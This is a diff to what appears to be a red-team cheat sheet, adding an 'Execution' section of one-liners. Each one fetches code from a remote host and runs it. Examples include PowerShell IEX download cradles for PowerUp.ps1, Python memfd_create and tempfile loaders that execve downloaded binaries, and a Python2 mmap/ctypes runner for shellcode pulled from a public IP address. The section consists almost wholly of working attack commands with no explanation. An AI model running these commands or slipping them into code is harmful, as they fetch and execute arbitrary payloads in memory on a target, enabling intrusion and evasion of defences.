@@ -4,6 +4,7 @@
 - [OSINT](#osint)  
 - [External Recon](#external-recon)  
 - [Initial Access](#initial-access)  
+- [Execution](#execution)  
 - [Command & Control](#command--control)  
 - [Credential Access](#credential-access)  
 - [Lateral Movement](#lateral-movement)  
@@ -87,6 +88,48 @@ smbclient -U '%' -N -L \\\\10.10.10.10\\</code></pre>
 </table>
 
 ---
+
+## Execution
+
+<table>
+  <tr>
+    <td><b>PowerUp in Memory (CMD)</b></td>
+    <td>
+      <pre><code>echo IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/PowerUp.ps1') | powershell -noprofile -</code></pre>
+    </td>
+  </tr>
+  <tr>
+    <td><b>PowerUp in Memory (PowerShell)</b></td>
+    <td>
+      <pre><code>wget('http://10.10.10.10/PowerUp.ps1') -UseBasicParsing | iex</code></pre>
+    </td>
+  </tr>
+  <tr>
+    <td><b>Python3 ELF In-Memory (No Params)</b></td>
+    <td>
+      <pre><code>python3.7 -c 'import os, urllib.request; d=urllib.request.urlopen("http://10.10.0.103/test.exe"); fd=os.memfd_create("foo"); os.write(fd,d.read()); p=f"/proc/self/fd/{fd}"; os.execve(p, [p], {})'</code></pre>
+    </td>
+  </tr>
+  <tr>
+    <td><b>Python3 ELF In-Memory (With Params)</b></td>
+    <td>
+      <pre><code>python3 -c 'import os; import urllib.request; d = urllib.request.urlopen("https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap?raw=true"); fd = os.memfd_create("foo"); os.write(fd, d.read()); p = f"/proc/self/fd/{fd}"; os.execve(p, [p,"-Pn", "-n", "127.0.0.1"], {})'</code></pre>
+    </td>
+  </tr>
+  <tr>
+    <td><b>Python2 Shellcode Execution</b></td>
+    <td>
+      <pre><code>/usr/bin/python -c 'import urllib2,mmap,ctypes;d=urllib2.urlopen("http://8.209.128.8/a").read();m=mmap.mmap(-1,len(d),34,7);m.write(d);ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes.c_char.from_buffer(m)))()'</code></pre>
+    </td>
+  </tr>
+  <tr>
+    <td><b>Python2 Temp ELF Execution</b></td>
+    <td>
+      <pre><code>/usr/bin/python -c 'import os,urllib2,tempfile;d=urllib2.urlopen("http://8.209.128.8/config").read();f=tempfile.NamedTemporaryFile(delete=False);f.write(d);f.close();os.chmod(f.name,0755);os.execve(f.name,[f.name,"-pthread"],{})'</code></pre>
+    </td>
+  </tr>
+</table>
+
 
 ## Command & Control
 
